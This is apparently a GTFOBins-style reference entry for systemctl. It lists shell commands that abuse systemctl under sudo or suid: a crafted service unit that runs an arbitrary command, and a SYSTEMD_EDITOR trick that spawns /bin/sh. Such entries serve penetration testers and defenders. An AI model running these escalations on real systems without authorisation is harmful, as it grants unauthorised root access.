---
type: gtfobin
name: systemctl
platform: Unix
functions: [inherit, shell]
tags: [gtfobin, unix, lotl]
---

# systemctl

## inherit

```bash
systemctl
```
**Contexts:** sudo, suid, unprivileged

## shell

```bash
echo '[Service]
Type=oneshot
ExecStart=/path/to/command
[Install]
WantedBy=multi-user.target' >/path/to/temp-file.service
systemctl link /path/to/temp-file.service
systemctl enable --now /path/to/temp-file.service
```
_It might happen that the service is not started with `--now`, in such cases it might be necessary to manually start it._
**Contexts:** sudo, suid

```bash
echo /bin/sh >/path/to/temp-file
chmod +x /path/to/temp-file
SYSTEMD_EDITOR=/path/to/temp-file systemctl edit basic.target
```
**Contexts:** sudo
